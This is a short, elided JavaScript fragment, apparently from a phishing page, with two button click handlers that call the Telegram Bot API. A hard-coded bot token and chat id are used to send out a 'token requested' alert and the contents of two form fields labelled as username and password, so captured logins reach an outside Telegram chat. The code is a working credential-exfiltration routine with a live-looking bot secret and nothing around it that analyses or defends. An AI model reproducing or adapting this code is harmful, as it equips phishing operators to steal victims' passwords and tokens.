...
requestbutton.addEventListener("click", () => {
  ...
  const url =
    "https://api.telegram.org/bot7084094896:AAH5wk7QA4dwqfJJx2pXi5mTL3uQacDxoao/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO";
  Http.open("GET", url);
  Http.send();
...
sendatatme.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot7084094896:AAH5wk7QA4dwqfJJx2pXi5mTL3uQacDxoao/sendMessage?chat_id=7101053333&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
